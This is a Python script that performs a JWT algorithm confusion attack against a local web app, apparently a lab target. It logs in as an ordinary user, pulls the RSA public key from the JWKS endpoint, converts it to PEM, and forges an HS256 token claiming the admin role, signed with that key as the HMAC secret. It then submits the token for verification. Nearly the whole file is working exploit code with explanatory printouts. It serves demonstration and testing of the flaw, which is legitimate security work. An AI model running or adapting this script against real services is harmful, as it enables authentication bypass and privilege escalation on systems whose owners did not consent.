#!/usr/bin/env python3
# /// script
# dependencies = [
#   "pyjwt>=2.8.0",
#   "requests>=2.31.0",
#   "cryptography>=41.0.0",
# ]
# ///

"""
JWT Algorithm Confusion Attack Script
Demonstrates exploitation of JWT algorithm confusion vulnerability
"""

import jwt
import json
import requests
import hmac
import hashlib
import base64
from datetime import datetime, timedelta

# Configuration
BASE_URL = "http://localhost:3000"

def print_step(step_num, description):
    """Pretty print step headers"""
    print(f"\n{'='*60}")
    print(f"STEP {step_num}: {description}")
    print('='*60)

def base64url_encode(data):
    """Base64URL encode without padding"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def create_jwt_hs256(payload, secret):
    """
    Manually create a JWT with HS256 algorithm
    This bypasses PyJWT's safety checks
    """
    # Create header - use compact JSON (no spaces)
    header = {
        "alg": "HS256",
        "typ": "JWT"
    }

    # Encode header and payload with compact JSON (no spaces after : or ,)
    header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())

    # Create message to sign
    message = f"{header_encoded}.{payload_encoded}".encode()

    # Create HMAC signature using the secret (public key)
    signature = hmac.new(secret, message, hashlib.sha256).digest()
    signature_encoded = base64url_encode(signature)

    # Combine all parts
    token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
    return token

def main():
    print("JWT Algorithm Confusion Attack")
    print("Target:", BASE_URL)

    # Step 1: Login as regular user
    print_step(1, "Login as regular user")
    login_response = requests.post(
        f"{BASE_URL}/api/auth/login",
        json={
            "email": "user@example.com",
            "password": "password123"
        }
    )

    if login_response.status_code != 200:
        print(f"❌ Login failed: {login_response.text}")
        return

    user_token = login_response.json()["token"]
    print(f"✅ Got user token")
    print(f"Token (truncated): {user_token[:50]}...")

    # Decode to see current claims
    user_claims = jwt.decode(user_token, options={"verify_signature": False})
    print(f"Current role: {user_claims.get('role')}")
    print(f"Current email: {user_claims.get('email')}")

    # Step 2: Fetch public key from JWKS endpoint
    print_step(2, "Fetch public key from JWKS endpoint")
    jwks_response = requests.get(f"{BASE_URL}/api/auth/jwks")

    if jwks_response.status_code != 200:
        print(f"❌ Failed to fetch JWKS: {jwks_response.text}")
        return

    jwk = jwks_response.json()["keys"][0]
    print(f"✅ Retrieved public key from JWKS")
    print(f"Key type: {jwk.get('kty')}")
    print(f"Algorithm: {jwk.get('alg')}")

    # Step 3: Convert JWK to PEM format
    print_step(3, "Convert JWK to PEM format")
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend

    # Decode the modulus and exponent from JWK
    def base64url_decode(input_str):
        """Decode base64url encoded string"""
        padding = 4 - (len(input_str) % 4)
        if padding != 4:
            input_str += '=' * padding
        return base64.urlsafe_b64decode(input_str)

    n = int.from_bytes(base64url_decode(jwk['n']), byteorder='big')
    e = int.from_bytes(base64url_decode(jwk['e']), byteorder='big')

    # Construct RSA public key
    public_numbers = rsa.RSAPublicNumbers(e, n)
    public_key = public_numbers.public_key(default_backend())

    # Convert to PEM format
    public_key_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).rstrip(b'\n')

    print("✅ Converted JWK to PEM format")

    # Step 4: Forge JWT with HS256 using public key as secret
    print_step(4, "Forge admin JWT using HS256 algorithm")

    # Create forged payload with admin privileges
    forged_payload = {
        "sub": "999",
        "email": "attacker@example.com",
        "role": "admin",  # 🚨 Privilege escalation!
        "iat": int(datetime.now().timestamp()),
        "exp": int((datetime.now() + timedelta(hours=1)).timestamp())
    }

    print(f"Forged claims: {json.dumps(forged_payload, indent=2)}")

    # 🔥 The vulnerability: Using HS256 with public key PEM as HMAC secret
    forged_token = create_jwt_hs256(forged_payload, public_key_pem)

    print(f"✅ Forged admin token created")
    print(f"Token (truncated): {forged_token[:50]}...")

    # Verify it's using HS256
    header = jwt.get_unverified_header(forged_token)
    print(f"Token algorithm: {header['alg']}")

    # Step 5: Exploit the vulnerability
    print_step(5, "Exploit algorithm confusion vulnerability")
    verify_response = requests.post(
        f"{BASE_URL}/api/auth/verify",
        json={"token": forged_token}
    )

    if verify_response.status_code == 200:
        result = verify_response.json()
        print("🎉 SUCCESS! Algorithm confusion attack worked!")
        print(f"\nServer Response:")
        print(json.dumps(result, indent=2))

        if result.get('exploited'):
            print(f"\n{'*'*60}")
            print(f"✅ VULNERABILITY CONFIRMED")
            print(f"✅ Server accepted HS256 token signed with public key")
            print(f"✅ Escalated to role: {result.get('decoded', {}).get('role')}")
            print(f"✅ Check Supabase for attack logs")
            print(f"{'*'*60}\n")
    else:
        print(f"❌ Attack failed")
        print(f"Status: {verify_response.status_code}")
        print(f"Response: {verify_response.text[:500]}")

    print_step("COMPLETE", "Attack finished")
    print("\nThe vulnerability exploited:")
    print("- Server accepts both RS256 and HS256 algorithms")
    print("- Public key PEM was used as HMAC secret for HS256")
    print("- This allowed forging tokens with elevated privileges")
    print("\nHow it works:")
    print("- RS256 uses asymmetric crypto (public key verifies, private key signs)")
    print("- HS256 uses symmetric crypto (same key for sign and verify)")
    print("- If server uses public key to verify HS256, attacker can sign with it!")

if __name__ == "__main__":
    main()